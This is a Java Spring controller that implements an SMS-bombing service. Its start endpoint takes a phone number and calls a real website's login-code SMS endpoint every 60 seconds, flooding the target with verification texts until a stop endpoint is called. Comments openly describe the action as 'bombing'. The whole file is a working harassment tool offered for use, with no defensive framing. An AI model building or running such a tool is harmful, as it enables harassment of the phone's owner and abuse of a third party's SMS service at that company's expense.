package com.longbig.multifunction.api;

import com.longbig.multifunction.utils.OkHttpUtils;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

import java.util.concurrent.*;

/**
 * @author yuyunlong
 * @date 2022/10/6 10:47 下午
 * @description
 */
@RestController
@Slf4j
public class SMSBombingService {

    ScheduledExecutorService timer = Executors.newSingleThreadScheduledExecutor();

    @GetMapping("/smsbombing/start")
    public String smsbombingStart(String phoneNum) {
        //发送短信验证码的接口
        String api = "https://818ps.com/site-api/send-tel-login-code?num=%s&codeImg=undefined";
        String apiString = String.format(api, phoneNum);
        RequestSms requestSms = new RequestSms(apiString);
        //开始轰炸，每隔60s发一次
        timer.scheduleAtFixedRate(requestSms, 0, 60, TimeUnit.SECONDS);
        return "执行完成";
    }

    @GetMapping("/smsbombing/stop")
    public String smsbombingStop() {
        timer.shutdown();
        return "执行完成";
    }

    protected class RequestSms implements Runnable {
        private String apiString;
        RequestSms(){}
        RequestSms(String apiString){
            this.apiString = apiString;
        }

        @Override
        public void run() {
            try {
                String response = OkHttpUtils.get(apiString);
                log.info("短信轰炸执行，response:{}", response);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
